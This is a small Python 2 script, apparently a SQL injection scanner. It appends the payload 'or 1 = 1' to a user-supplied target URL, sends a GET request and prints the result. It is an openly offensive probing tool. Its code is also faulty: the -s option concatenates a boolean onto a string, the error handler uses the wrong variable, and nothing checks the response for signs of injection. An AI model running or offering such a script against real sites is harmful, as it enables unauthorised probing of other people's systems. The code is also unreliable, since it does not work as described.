#!/usr/bin/env python
#This script simple scans for sql injection targets

import requests
import sys
import argparse

def sqli_test(fullurl):
	try:
		result = requests.get(fullurl)
	except Exception as msg:
		print '[!] ERROR: {} Can not GET from url {}'.format(msg,url)
		sys.exit(1)
	return result

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
B = '\033[34m' # blue

#Argument parsing
help_message = ("USAGE:\n" +
                "The sqli_scanner.py checks sqli injection\n" +
				"Example:\n" +
				"sqli_scanner.py -t url.com") 
parser = argparse.ArgumentParser(usage=help_message, description='Tests sqli injection')
parser.add_argument('-t', help='URL of the target host', default=False)
parser.add_argument('-s', help='sqli test', default=False, action='store_true')
args = parser.parse_args()

url = args.t
sqli = args.s

#SQLI tests
sqli_list = [ "or 1 = 1"]

if __name__ == "__main__":
	
	print G + "[+] INFO: Starting check" + W

	if sqli:
		fullurl = url + sqli
		print fullurl
		print G + "[+] INFO: Trying {} on {}".format(sqli, url) + W
		result = sqli_test(fullurl)
		print G + "[+] INFO: Output from is {} ".format(result) + W
	
	else:
		for sqli in sqli_list:
			fullurl = url + sqli
			print fullurl
			print G + "[+] INFO: Trying {} on {}".format(sqli, url) + W
			result = sqli_test(fullurl)
			print G + "[+] INFO: Output from is {} ".format(result) + W

